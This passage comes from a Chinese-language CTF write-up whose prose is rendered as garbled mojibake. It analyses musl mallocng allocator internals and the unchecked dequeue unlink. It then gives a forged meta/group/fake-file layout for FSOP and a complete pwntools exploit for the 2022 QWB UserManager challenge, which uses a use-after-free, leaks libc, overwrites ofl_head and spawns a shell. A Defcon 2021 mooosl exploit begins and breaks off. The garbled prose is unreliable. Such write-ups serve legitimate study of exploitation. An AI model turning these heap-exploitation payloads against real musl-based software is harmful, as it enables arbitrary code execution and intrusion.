cnt++; span += size; } if (cnt &gt; m-&gt;last_idx+1) cnt = m-&gt;last_idx+1; m-&gt;mem-&gt;active_idx = cnt-1; } } // å°† freed_mask è½¬ä¸º avail_mask mask = activate_group(m); assert(mask); decay_bounces(m-&gt;sizeclass); } first = mask&amp;-mask; m-&gt;avail_mask = mask-first; return first;} è‹¥ active ç¬¬ä¸€ä¸ª meta çš„ chunk éƒ½æ˜¯ inuseï¼Œåˆ™å°†æ­¤ meta ä» active å’Œ é“¾è¡¨ä¸­ç§»å‡º å°† active ç¬¬ä¸€ä¸ª meta è®¾ç½®ä¸ºä¸‹ä¸€ä¸ª meta å°†å…¶ freed_mask è½¬ä¸º avail_mask ä½¿ç”¨ å– avail_mask ä¸­ idx æœ€å°çš„ chunk queue./src/malloc/mallocng/meta.h1234567891011121314static inline void queue(struct meta **phead, struct meta *m){ assert(!m-&gt;next); assert(!m-&gt;prev); if (*phead) { struct meta *head = *phead; m-&gt;next = head; m-&gt;prev = head-&gt;prev; m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m; } else { m-&gt;prev = m-&gt;next = m; *phead = m; }} dequeue./src/malloc/mallocng/meta.h1234567891011static inline void dequeue(struct meta **phead, struct meta *m){ if (m-&gt;next != m) { m-&gt;prev-&gt;next = m-&gt;next; m-&gt;next-&gt;prev = m-&gt;prev; if (*phead == m) *phead = m-&gt;next; } else { *phead = 0; } m-&gt;prev = m-&gt;next = 0;} å¦‚æœèƒ½å¤Ÿä¼ªé€  metaï¼Œå¯ä»¥ä»»æ„åœ°å€å†™ alloc_group./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123static struct meta *alloc_group(int sc, size_t req){ size_t size = UNIT*size_classes[sc]; int i = 0, cnt; unsigned char *p; // ä¼˜å…ˆå¯»æ‰¾ freed_metaï¼Œå°†å…¶ä» ctx.free_meta_head ç§»é™¤ // è‹¥æ²¡æœ‰å°±ä» meta_area ä¸­æŒ‰åœ°å€ä»ä½åˆ°é«˜é¡ºåºå–ä¸€ä¸ª // å¦‚æœ meta_area æ»¡äº†ï¼Œåˆ™å†ç”³è¯·ä¸€ä¸ª meta_area // ä¼šå°† meta çš„ prevï¼Œnext ç½®é›¶ struct meta *m = alloc_meta(); if (!m) return 0; size_t usage = ctx.usage_by_class[sc]; size_t pagesize = PGSZ; int active_idx; /* è®¾ç½® cntï¼Œä¹Ÿå°±æ˜¯ group èƒ½å®¹çº³ chunk æœ€å¤§æ•°é‡ */ if (sc &lt; 9) { while (i&lt;2 &amp;&amp; 4*small_cnt_tab[sc][i] &gt; usage) i++; cnt = small_cnt_tab[sc][i]; } else { // lookup max number of slots fitting in power-of-two size // from a table, along with number of factors of two we // can divide out without a remainder or reaching 1. cnt = med_cnt_tab[sc&amp;3]; // reduce cnt to avoid excessive eagar allocation. while (!(cnt&amp;1) &amp;&amp; 4*cnt &gt; usage) cnt &gt;&gt;= 1; // data structures don't support groups whose slot offsets // in units don't fit in 16 bits. while (size*cnt &gt;= 65536*UNIT) cnt &gt;&gt;= 1; }/* end */ // If we selected a count of 1 above but it's not sufficient to use // mmap, increase to 2. Then it might be; if not it will nest. if (cnt==1 &amp;&amp; size*cnt+UNIT &lt;= pagesize/2) cnt = 2; // All choices of size*cnt are &quot;just below&quot; a power of two, so anything // larger than half the page size should be allocated as whole pages. if (size*cnt+UNIT &gt; pagesize/2) { // check/update bounce counter to start/increase retention // of freed maps, and inhibit use of low-count, odd-size // small mappings and single-slot groups if activated. int nosmall = is_bouncing(sc); account_bounce(sc); step_seq(); // since the following count reduction opportunities have // an absolute memory usage cost, don't overdo them. count // coarse usage as part of usage. if (!(sc&amp;1) &amp;&amp; sc&lt;32) usage += ctx.usage_by_class[sc+1]; // try to drop to a lower count if the one found above // increases usage by more than 25%. these reduced counts // roughly fill an integral number of pages, just not a // power of two, limiting amount of unusable space. if (4*cnt &gt; usage &amp;&amp; !nosmall) { if (0); else if ((sc&amp;3)==1 &amp;&amp; size*cnt&gt;8*pagesize) cnt = 2; else if ((sc&amp;3)==2 &amp;&amp; size*cnt&gt;4*pagesize) cnt = 3; else if ((sc&amp;3)==0 &amp;&amp; size*cnt&gt;8*pagesize) cnt = 3; else if ((sc&amp;3)==0 &amp;&amp; size*cnt&gt;2*pagesize) cnt = 5; } size_t needed = size*cnt + UNIT; needed += -needed &amp; (pagesize-1); // produce an individually-mmapped allocation if usage is low, // bounce counter hasn't triggered, and either it saves memory // or it avoids eagar slot allocation without wasting too much. if (!nosmall &amp;&amp; cnt&lt;=7) { req += IB + UNIT; req += -req &amp; (pagesize-1); if (req&lt;size+UNIT || (req&gt;=4*pagesize &amp;&amp; 2*cnt&gt;usage)) { cnt = 1; needed = req; } } p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) { free_meta(m); return 0; } m-&gt;maplen = needed&gt;&gt;12; ctx.mmap_counter++; active_idx = (4096-UNIT)/size-1; if (active_idx &gt; cnt-1) active_idx = cnt-1; if (active_idx &lt; 0) active_idx = 0; } else { int j = size_to_class(UNIT+cnt*size-IB); // ä»å¤§ group ä¸­ç”³è¯·å° groupï¼Œå¤§ group çš„ chunk ä½œä¸ºæ•´ä¸ªå° groupï¼Œæ˜¯ä¸€ä¸ªé€’å½’è¿‡ç¨‹ int idx = alloc_slot(j, UNIT+cnt*size-IB); if (idx &lt; 0) { free_meta(m); return 0; } struct meta *g = ctx.active[j]; p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter); m-&gt;maplen = 0; p[-3] = (p[-3]&amp;31) | (6&lt;&lt;5); for (int i=0; i&lt;=cnt; i++) p[UNIT+i*size-4] = 0; active_idx = cnt-1; } // å¢åŠ å¯ç”¨ chunk ä¸ªæ•° ctx.usage_by_class[sc] += cnt; // åˆå§‹åŒ– meta å’Œ group m-&gt;avail_mask = (2u&lt;&lt;active_idx)-1; m-&gt;freed_mask = (2u&lt;&lt;(cnt-1))-1 - m-&gt;avail_mask; m-&gt;mem = (void *)p; m-&gt;mem-&gt;meta = m; // group çš„ active_idx å’Œ meta çš„ last_idx ä¸€èˆ¬æ˜¯ç›¸ç­‰çš„ï¼Œä¸º cnt-1 m-&gt;mem-&gt;active_idx = active_idx; m-&gt;last_idx = cnt-1; m-&gt;freeable = 1; m-&gt;sizeclass = sc; return m;} emframe./src/malloc/mallocng/meta.h123456789101112131415161718192021222324252627282930313233343536373839404142434445static inline void *enframe(struct meta *g, int idx, size_t n, int ctr){ // è·å– chunk å¤§å° size_t stride = get_stride(g); // è®¡ç®— chunk å¤šä½™ç©ºé—´ size_t slack = (stride-IB-n)/UNIT; // p æŒ‡å‘ chunk çš„ data èµ·å§‹ä½ç½® unsigned char *p = g-&gt;mem-&gt;storage + stride*idx; unsigned char *end = p+stride-IB; // cycle offset within slot to increase interval to address // reuse, facilitate trapping double-free./* check */ // p[-3] = chunk_idx // *(uint16_t *)(p-2) = chunk_offset // å– chunk çš„ offsetï¼Œä¸€èˆ¬ä¸º 0 int off = (p[-3] ? *(uint16_t *)(p-2) + 1 : ctr) &amp; 255; assert(!p[-4]); if (off &gt; slack) { size_t m = slack; m |= m&gt;&gt;1; m |= m&gt;&gt;2; m |= m&gt;&gt;4; off &amp;= m; if (off &gt; slack) off -= slack+1; assert(off &lt;= slack); } if (off) { // store offset in unused header at offset zero // if enframing at non-zero offset. *(uint16_t *)(p-2) = off; p[-3] = 7&lt;&lt;5; p += UNIT*off; // for nonzero offset there is no permanent check // byte, so make one. p[-4] = 0; }/* end */ // è®¾ç½® offset å’Œ idx *(uint16_t *)(p-2) = (size_t)(p-g-&gt;mem-&gt;storage)/UNIT; p[-3] = idx; // è®¾ç½® reserved set_size(p, end, n); return p;} æ€»ç»“ä¸€ä¸‹ä»¥ä¸‹ä¸ºä¸€èˆ¬æƒ…å†µçš„æµç¨‹ï¼Œçœç•¥äº†ç‰¹æ®Šæƒ…å†µ æ£€æŸ¥ç”³è¯·çš„ size å¦‚æœ size è¾¾åˆ°éœ€è¦ mmap çš„é˜ˆå€¼ ç›´æ¥è°ƒç”¨ mmapï¼Œè¿”å›çš„åœ°å€ä½œä¸º group è·å–å¹¶åˆå§‹åŒ– meta last_idx = 0ï¼Œåªæœ‰ä¸€ä¸ª chunkï¼Œå› æ­¤å®ƒä¸ä¼šå† ctx.active ä¸­ sizeclass = 63 maplen = (size + 4 + 0x10 + 4095) / 4096 avail_mask = freed_mask = 0 ctx.mmap_counter++ è¿›å…¥ success æ²¡æœ‰åˆ™è°ƒç”¨ size_to_class å°† size è®¡ç®—ä¸ºå¯¹åº”çš„ scï¼ˆsizeclassï¼‰ è·å–å¯¹åº”çš„ meta å– sc å¯¹åº”å¤§å°çš„å¯åˆ†é…çš„ metaï¼ˆctx.active[sc]) è‹¥ä¸å­˜åœ¨æ»¡è¶³ä¸‹åˆ—æ‰€æœ‰æ¡ä»¶ä¼šå–ç¨å¤§ä¸€ç‚¹çš„ meta 4&lt;= sc &lt;32 sc != 6 sc ä¸ºå¶æ•° å¯¹åº”å¤§å°çš„æ‰€æœ‰ chunk æ•°é‡ä¸º 0ï¼ˆæ²¡æœ‰å¯¹åº”å¤§å°çš„ metaï¼‰ è·å– chunk çš„ idx å– meta çš„ç¬¬ä¸€ä¸ª avail_chunk è‹¥ avail_chunk å­˜åœ¨ å°† avail_mask ä¸Šå¯¹åº”çš„ä½ç½®ç½®é›¶ è¿›å…¥ success è¿›å…¥ alloc_slot è¿›è¡Œè¿›ä¸€æ­¥ç”³è¯· è°ƒç”¨ try_avail å°è¯• ctx.active[sc] é“¾è¡¨ä¸­çš„æ‰€æœ‰ meta æ£€æŸ¥ç¬¬ä¸€ä¸ª meta çš„ freed_mask è‹¥ freed_mask ä¸º 0ï¼Œä¼šè°ƒç”¨ **dequeue**ï¼Œå°†å…¶ç§»é™¤ ctx.active[sc] å› ä¸ºç¬¬ä¸€ä¸ª meta æ²¡æœ‰ unuse_chunk å°†ä¸‹ä¸€ä¸ª meta åˆ‡æ¢ä¸ºç¬¬ä¸€ä¸ª metaï¼ˆctx.active[sc] = m-&gt;next) å°† meta çš„ freed_mask è½¬ä¸º avail_mask å– meta çš„ç¬¬ä¸€ä¸ª avail_chunkï¼Œå°† avail_mask ä¸Šå¯¹åº”çš„ä½ç½®ç½®é›¶ è¿”å›ç¬¬ä¸€ä¸ª avail_chunk å¯¹åº”çš„ avail_mask ä½ç½® æ³¨ï¼šä¸‹ä¸€ä¸ª meta å¯èƒ½æ˜¯å®ƒè‡ªå·±ï¼ˆå¾ªç¯ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ unused_maskï¼Œæœ€ç»ˆä¼šè¿”å› 0 å¦‚æœ try_avail è¿”å› 0ï¼Œä¼šè°ƒç”¨ alloc_group ç”³è¯·ä¸€ä¸ªæ–°çš„ group å…ˆè°ƒç”¨ alloc_meta ç”³è¯·ä¸€ä¸ª metaï¼Œä¼˜å…ˆå– freed_meta å†ä» meta_area ä¸­å–æ–°çš„ æ–°çš„ group ä¸€èˆ¬å–æ›´å¤§çš„ chunk ä½œä¸ºæ•´ä¸ª groupï¼Œæ˜¯ä¸€ä¸ªé€’å½’è¿‡ç¨‹ meta çš„ avail_mask å‡ä¸€ï¼Œå³ä½¿ç”¨ç¬¬ä¸€ä¸ª chunk è°ƒç”¨ queue å°† meta æ”¾å…¥ ctx.active[sc] è¿›å…¥ success è°ƒç”¨ enframe å¯¹ chunk åˆå§‹åŒ– (unsigned char*) p[-3] = idx *(uint16_t) (p - 2) = offset è®¾ç½® reserved æ€»ç»“ç®€å•ç‰ˆåˆ†é… chunk é¡ºåº ctx.active[sc] -&gt; avail_mask malloc_context.active å¯¹åº”å¤§å°çš„ meta ä¸­çš„ avail_chunk ctx.active[sc] -&gt; next -&gt; freed_mask malloc_context.active å¯¹åº”å¤§å°çš„ meta çš„ ä¸‹ä¸€ä¸ª meta ä¸­çš„ freed_chunk å¦‚æœ ctx.active[sc] çš„ chunk éƒ½æ˜¯ inuseï¼Œåˆ™ä¼šè°ƒç”¨ **dequeue**ï¼Œå°†å…¶ç§»å‡º active å’Œé“¾è¡¨ å…ˆæŠŠ freed_mask è½¬ä¸º avail_maskï¼Œç„¶åå°† ctx.active[sc] è®¾ä¸ºè¯¥ meta ctx.active[sc] -&gt; freed_mask malloc_context.active å¯¹åº”å¤§å°çš„ meta ä¸­çš„ freed_chunk new_meta -&gt; avail_mask ç”³è¯·ä¸€ä¸ªæ–°çš„ metaï¼Œå–å…¶ avail_chunk freefree./src/malloc/mallocng/free.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546void free(void *p){ if (!p) return; struct meta *g = get_meta(p); int idx = get_slot_index(p); size_t stride = get_stride(g); unsigned char *start = g-&gt;mem-&gt;storage + stride*idx; unsigned char *end = start + stride - IB; // æ£€æŸ¥ reserved get_nominal_size(p, end); uint32_t self = 1u&lt;&lt;idx, all = (2u&lt;&lt;g-&gt;last_idx)-1; // idx å’Œ reserved ç½® 0xffï¼Œoffset ç½® 0 ((unsigned char *)p)[-3] = 255; // invalidate offset to group header, and cycle offset of // used region within slot if current offset is zero. *(uint16_t *)((char *)p-2) = 0; // release any whole pages contained in the slot to be freed // unless it's a single-slot group that will be unmapped. if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx) { unsigned char *base = start + (-(uintptr_t)start &amp; (PGSZ-1)); size_t len = (end-base) &amp; -PGSZ; if (len) madvise(base, len, MADV_FREE); } // atomic free without locking if this is neither first or last slot for (;;) { uint32_t freed = g-&gt;freed_mask; uint32_t avail = g-&gt;avail_mask; uint32_t mask = freed | avail; assert(!(mask&amp;self)); // å¦‚æœæ²¡æœ‰ freed_chunk æˆ–è€…éƒ½æ˜¯ unuse_chunkï¼Œåˆ™è·³å‡ºå¾ªç¯ if (!freed || mask+self==all) break; if (!MT) g-&gt;freed_mask = freed+self; else if (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed) continue; return; } wrlock(); struct mapinfo mi = nontrivial_free(g, idx); unlock(); if (mi.len) munmap(mi.base, mi.len);} å¦‚æœå…¶ä»– chunk éƒ½ä¸æ˜¯ freed_chunk æˆ–è€…éƒ½æ˜¯ unuse_chunk åˆ™ä¼š è¿›å…¥ nontrivial_free nontrivial_free./src/malloc/mallocng/free.c1234567891011121314151617181920212223242526272829303132static struct mapinfo nontrivial_free(struct meta *g, int i){ uint32_t self = 1u&lt;&lt;i; int sc = g-&gt;sizeclass; uint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask; // ä¸€èˆ¬æƒ…å†µï¼Œåªè¦æ‰€æœ‰ chunk éƒ½æ˜¯ unuseï¼Œå°±ä¼š free meta å’Œ group if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) { // any multi-slot group is necessarily on an active list // here, but single-slot groups might or might not be. if (g-&gt;next) { assert(sc &lt; 48); int activate_new = (ctx.active[sc]==g); dequeue(&amp;ctx.active[sc], g); // å°†ä¸‹ä¸€ä¸ª meta çš„ freed_chunk è½¬ä¸º avail_chunk if (activate_new &amp;&amp; ctx.active[sc]) activate_group(ctx.active[sc]); } return free_group(g); } else if (!mask) { // å¦‚æœ meta ä¸åœ¨ active é‡Œï¼Œåˆ™æ”¾å…¥ actvie ä¸­ assert(sc &lt; 48); // might still be active if there were no allocations // after last available slot was taken. if (ctx.active[sc] != g) { queue(&amp;ctx.active[sc], g); } } // g-&gt;freed_mask = g-&gt;free_mask &amp; self a_or(&amp;g-&gt;freed_mask, self); return (struct mapinfo){ 0 };} æ‰€æœ‰ chunk éƒ½æ˜¯ unuse_chunk å°†è¯¥ meta ä» active å’Œé“¾è¡¨ä¸­ç§»é™¤ å°†é“¾è¡¨çš„ä¸‹ä¸€ä¸ª meta çš„ freed_chunk è½¬ä¸º avail_chunk free è¯¥ meta å’Œ group æ²¡æœ‰ freed_chunk å°†è¯¥ meta æ’å…¥ active çš„é“¾è¡¨å°¾éƒ¨ free_group./src/malloc/mallocng/free.c1234567891011121314151617181920212223static struct mapinfo free_group(struct meta *g){ struct mapinfo mi = { 0 }; int sc = g-&gt;sizeclass; if (sc &lt; 48) { ctx.usage_by_class[sc] -= g-&gt;last_idx+1; } if (g-&gt;maplen) { step_seq(); record_seq(sc); mi.base = g-&gt;mem; mi.len = g-&gt;maplen*4096UL; } else { void *p = g-&gt;mem; struct meta *m = get_meta(p); int idx = get_slot_index(p); g-&gt;mem-&gt;meta = 0; // not checking size/reserved here; it's intentionally invalid mi = nontrivial_free(m, idx); } free_meta(g); return mi;} æ€»ç»“ä¸€ä¸‹ è·å– chunk çš„ metaã€idxã€sc æ£€æŸ¥ reserved idx å’Œ reserved ç½®ä¸º 0xffï¼Œoffset ç½®é›¶ æ£€æŸ¥ avail_mask å’Œ freed_mask è‹¥å­˜åœ¨ freed_chunk ä¸”æœ‰å…¶ä»–çš„ inuse_chunk å°† freed_mask ä¸Šè¯¥ chunk å¯¹åº”çš„ä½ç½®è®¾ä¸º 1 ç»“æŸ free å‡½æ•° å¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ è°ƒç”¨ nontrivial_free å‡½æ•°åšè¿›ä¸€æ­¥å¤„ç† å¦‚æœæ‰€æœ‰ chunk éƒ½æ˜¯ unuse_chunk å¦‚æœ meta çš„ next å­˜åœ¨ï¼Œè°ƒç”¨ dequeue å°† meta ä» ctx.active[sc] ä¸­ç§»å‡º free æ‰ meta å’Œ group ç»“æŸ free å‡½æ•° å¦‚æœå…¶ä»– chunk éƒ½æ˜¯ inuse_chunk ä¸” meta ä¸åœ¨ ctx.artive[sc] ä¸­ è°ƒç”¨ queue å°† meta æ”¾å…¥ ctx.active[sc] å°† freed_mask ä¸Šè¯¥ chunk å¯¹åº”çš„ä½ç½®è®¾ä¸º 1 å…³é”®dequeue./src/malloc/mallocng/meta.h1234567891011static inline void dequeue(struct meta **phead, struct meta *m){ if (m-&gt;next != m) { m-&gt;prev-&gt;next = m-&gt;next; m-&gt;next-&gt;prev = m-&gt;prev; if (*phead == m) *phead = m-&gt;next; } else { *phead = 0; } m-&gt;prev = m-&gt;next = 0;} å‡ ä¹æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œå¦‚æœèƒ½å¤Ÿä¼ªé€  metaï¼Œå¯ä»¥ä»»æ„åœ°å€å†™ è°ƒç”¨é€”å¾„ malloc -&gt; try_avail -&gt; dequeue free -&gt; nontrivial_free -&gt; dequeue åˆ©ç”¨ æ³„éœ²ä¸€äº›é‡è¦ä¿¡æ¯ å¤§éƒ¨åˆ†éƒ½å¯ä»¥ä» malloc_context ä¸­è·å– libc åŸºå€ secret ä¼ªé€  meta_areaã€areaã€groupã€chunk ä¸‹é¢æ˜¯ä¸€äº›ä¼ªé€ çš„ç¡¬æ€§è¦æ±‚æˆ–è€…å»ºè®® meta_area å› ä¸º get_meta æ—¶ä¼šæ£€æŸ¥ secret é˜²æ­¢ä¼ªé€ ï¼Œè€Œæ£€æŸ¥æ—¶å– meta_area åœ°å€æ˜¯å– area æ‰€åœ¨é¡µçš„åœ°å€ï¼Œå› æ­¤ä¼ªé€ çš„ meta_area åœ°å€å 12 ä½éƒ½è¦ä¸º 0ï¼Œä¸€èˆ¬é€šè¿‡ mmap ä¼ªé€  check == malloc_context.secret area prevï¼Œnext æ”¹æˆæƒ³å†™çš„ä½ç½® mem == fake_group last_idx == 0ï¼Œä¸€èˆ¬åªéœ€è¦ä¼ªé€ ä¸€ä¸ª chunkï¼Œè¿™æ · free fake_chunk æ—¶ç›´æ¥èƒ½è¿›å…¥ nontrivial_free avail_maskï¼Œfreed_mask å…¨ä¸º 0 å³å¯ï¼ˆå› ä¸ºåªæœ‰ä¸€ä¸ªå°†è¦ free çš„ fake_chunkï¼‰ sc &lt; 48 freeable == 1 maplen != 0ï¼Œå¦åˆ™åœ¨ free_group ä¼šè¿›è¡Œé€’å½’ freeï¼Œéšä¾¿å–ä¸ªå€¼å°±è¡Œ group meta == fake_meta active_idx == 0 chunk ä¸€èˆ¬æ˜¯ fake_fike æˆ–è€…å…¶ä»–åƒåœ¾æ•°æ® ä¸‹é¢çš„ä¾‹å­æ˜¯å°† ofl_head æŒ‡å‘ fake_chunkï¼ˆfake_fileï¼‰ï¼Œexit æ—¶å°±å¯ä»¥å¯¼è‡´ FSOP 12345678910111213141516171819202122last_idx = 0freeable = 1sc = 8maplen = 1fake_meta = p64(addr_fake_chunk) # prevfake_meta += p64(addr_ofl_head) # next fake_meta += p64(addr_fake_group) # memfake_meta += p64(0) # avail &amp; freed maskfake_meta += p64(maplen &lt;&lt; 12 | sc &lt;&lt; 6 | freeable &lt;&lt; 5 | last_idx)active_idx = 0fake_group = p64(addr_fake_meta)fake_group += p64(active_idx)# fake_filefake_chunk = b&quot;/bin/sh\\x00&quot;fake_chunk += p64(0) * 7fake_chunk += p64(addr_system) * 7fake_meta_area = p64(secret) # checkfake_meta_area += p64(0) # nextfake_meta_area += p64(1) # nsolts 2022 qwb UserManagerè¿™é‡Œåªè¦ä¼šå †é£æ°´å°±è¡Œï¼Œä¸éœ€è¦ä¼ªé€ å°±å¯ä»¥ä»»æ„åœ°å€å†™ä¸€æ¬¡ 12345678910111213141516171819202122232425262728void __fastcall insert(User *newUser, User *users){ while ( users ) { // UAF if ( newUser-&gt;id == users-&gt;id ) { newUser-&gt;flag = users-&gt;flag; newUser-&gt;leftUser = users-&gt;leftUser; newUser-&gt;rightUser = users-&gt;rightUser; newUser-&gt;parentUser = users-&gt;parentUser; if ( users-&gt;leftUser ) users-&gt;leftUser-&gt;parentUser = newUser; if ( users-&gt;rightUser ) users-&gt;rightUser-&gt;parentUser = newUser; if ( users-&gt;parentUser != (User *)0xDEADBEEFLL ) { if ( users == users-&gt;parentUser-&gt;leftUser ) users-&gt;parentUser-&gt;leftUser = newUser; else users-&gt;parentUser-&gt;rightUser = newUser; } free(users-&gt;name); free(users); return; } ...} åœ¨æ·»åŠ  user çš„æ—¶å€™ï¼Œå¦‚æœæœ‰ id ç›¸åŒçš„ userï¼Œä¼šæŠŠåŸæ¥çš„ user é‡Šæ”¾æ‰ï¼Œä½†æ˜¯ users ä¼šæŒ‡å‘åŸæ¥çš„ userï¼Œé€ æˆ UAF å…ˆæ³„éœ²å‡º libc å’Œ elf åœ°å€ ä¸Šé¢çš„ç¬¬ 13 è¡Œå¯ä»¥ä»»æ„åœ°å€å†™ä¸€æ¬¡ï¼ŒæŠŠ ofl_head ä¿®æ”¹åˆ°å¯æ§ä½ç½® ä¼ªé€  fake_file æœ€å exit è¿›è¡Œ FSOP æœ€åå†™ fake_file çš„æ—¶å€™è¦å¤šæ¬¡å †é£æ°´ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *# p = remote('', )p = process('./' + __file__[0:-3])context(arch='amd64', os='linux', log_level='debug')elf = ELF(__file__[0:-3])libc = ELF(&quot;./libc.so&quot;)addr_insert = elf.sym[&quot;insert&quot;]def add(id, length, name): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;1&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id)) p.recvuntil(b&quot;length: &quot;) p.sendline(str(length)) p.recvuntil(b&quot;UserName: &quot;) p.send(name)def check(id): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id))def delete(id): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;3&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id))def clear(): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;4&quot;)def fengshui(times=1, length=0x8, name=&quot;aaad\\n&quot;, id=0): for _ in range(times): add(id, length, name) id += 1# gdb.attach(p)## leak addradd(0x100, 0x38, &quot;aaad\\n&quot;) # usersadd(0x100, 0x8, &quot;aaad\\n&quot;)fengshui(6)check(0x100)addr_elf = u64(p.recv(0x10)[-8:]) - 0x5ca0addr_libc = u64(p.recv(0x20)[-8:]) - 0xb7d60print(&quot;-&gt; addr_elf = &quot;, hex(addr_elf))print(&quot;-&gt; addr_libc = &quot;, hex(addr_libc))addr_system = addr_libc + libc.sym[&quot;system&quot;]addr_ofl_head = addr_libc + 0xb6e48## write ofl_head to fake_fileclear()add(0x6873, 0x38, &quot;aaad\\n&quot;) # usersadd(0x6873, 0x8, &quot;aaad\\n&quot;)fengshui(6)fake_user = p64(0x6873) + p64(addr_libc + 0xb7a60) + p64(0) + p64(1) fake_user += p64(0xdeadbeef) + p64(addr_ofl_head - 0x20) + p64(0)add(0x6873, 0x38, fake_user) # user-&gt;name --&gt; users## construct fake_fileclear()# gdb.attach(p)add(0x6873, 0x38, p64(addr_system) * 7) # ofl_head[0] = &quot;sh&quot;add(0x100, 0x8, &quot;aaad\\n&quot;)add(0x100, 0x38, p64(0) * 7) # ofl_head-&gt;lock = 0fengshui(3)add(0x50, 0x38, p64(addr_system) * 7) # ofl_head-&gt;write = systemp.sendline()p.interactive() Defcon Quals 2021 moooslç”¨çš„æœ¬åœ° libcï¼Œmusl 1.2.2-4 amd64 é™æ€åˆ†æä¸€ä¸ªå…¸å‹çš„èœå•é¢˜ï¼Œå­˜å‚¨ KV 12345678struct KV { char *key; char *value; __int64 key_size; __int64 value_size; __int64 hash; KV *next_KV;}; store æ¯æ¬¡å­˜å‚¨ä¸€ä¸ª KVï¼Œå†ç”³è¯· key å’Œ value å†…å­˜ï¼Œè®¡ç®— key çš„ hashï¼Œå– hash å 12 ä½å°†å…¶æ”¾å…¥ hash_map ä¸­ï¼Œç”¨å•é“¾è¡¨å­˜å‚¨ hash å 12 ä½ç›¸åŒçš„ KVï¼Œå¤´æ’æ³• å¯ç”¨äºå †é£æ°´ query å…ˆç”³è¯· key å†…å­˜ï¼Œç„¶åæ ¹æ® key çš„ hash åœ¨ hash_map ä¸­å¯»æ‰¾å¯¹åº”çš„ KVï¼Œè¾“å‡º value å†…å®¹ï¼Œæœ€åå°† key å†…å­˜ free å¯ç”¨äº å †é£æ°´ delete å…ˆç”³è¯· key å†…å­˜ï¼Œç„¶åæ ¹æ® key çš„ hash åœ¨ hash_map ä¸­å¯»æ‰¾å¯¹åº”çš„ KVï¼Œè¿›è¡Œåˆ é™¤ 12345678910111213141516kv = search(key, key_size);if ( kv ){ chain = &amp;hash_map[kv-&gt;hash &amp; 0xFFF]; // è¿™é‡Œå¿½ç•¥äº†ä¸€ä¸ªæ¡ä»¶ï¼Œå½“ kv æ˜¯é“¾è¡¨å°¾çš„æ—¶å€™ï¼Œä¸Šä¸€ä¸ª kv çš„ next_KV æ²¡æœ‰ç½®é›¶ï¼Œå¯¼è‡´ UAF if ( kv == *chain || kv-&gt;next_KV ) { while ( kv != *chain ) chain = &amp;(*chain)-&gt;next_KV; *chain = kv-&gt;next_KV; } free(kv-&gt;key); free(kv-&gt;value); free(kv); puts(&quot;ok&quot;);} åˆ©ç”¨ç‚¹ ç”³è¯·ä¸¤ä¸ª hash å 12 ä½ç›¸åŒçš„ kvï¼Œdelete åé¢ä¸€ä¸ªé€ æˆ UAF é€šè¿‡å †é£æ°´å’Œ query æ³„éœ²å‡ºé‡è¦ä¿¡æ¯ å†é€šè¿‡å †é£æ°´å’Œ deleteï¼Œä¼ªé€  meta_areaï¼Œé€šè¿‡ unsafe_unlink ä»»æ„åœ°å€å†™ ä¸»è¦æ˜¯é€šè¿‡ delete çš„ free(kv-&gt;key) æˆ– free(kv-&gt;value) æ¥ unlink å› ä¸ºè¿™ä¸¤ä¸ªæŒ‡é’ˆå¯ä»¥ä»»æ„å†™ï¼ˆç¬”è€…æƒ³äº†å¥½ä¹…æ­»æ´»æ²¡æƒ³å‡ºæ¥ï¼‰ é€šè¿‡æ”¹å†™ ofl_head æŒ‡å‘ä¼ªé€ çš„ file æœ€å exit å¯¼è‡´ FSOP ä¸‹é¢æ˜¯çœ‹åˆ«äºº wp æ˜¯åšæ³•ï¼Œè¦å†™ä¸‰æ¬¡ï¼Œä¼ªé€ ä¸‰æ¬¡ï¼ˆé€†å¤©ï¼‰ é€šè¿‡æ”¹å†™ stdout çš„ write å‡½æ•°æŒ‡é’ˆä¸º system å’Œ flags ä¸º /bin/sh\\x00ï¼Œå¹¶ä½¿ wpos != wbase å³å¯å¯¼è‡´ FSOP æ‹¿åˆ° shell æ€è·¯å¾ˆç®€å•ï¼Œä½†æ˜¯ exp æ˜¯çœŸçš„éš¾å†™ğŸ˜­ğŸ˜­ exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169from pwn import *context(arch='amd64', os='linux', log_level='debug')address = &quot;&quot;.split(':')filename = &quot;./&quot; + __file__[0:-3]elf = ELF(__file__[0:-3])# p = remote(address[0], address[1])p = process(__file__[0:-3])libc = ELF(&quot;/usr/lib/x86_64-linux-musl/libc.so&quot;)def store(key, value, key_size=None, value_size=None): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;1&quot;) p.recvuntil(b&quot;size: &quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key) p.recvuntil(b&quot;size: &quot;) if value_size == None : value_size = len(value) p.sendline(str(value_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(value)def query(key, key_size=None): 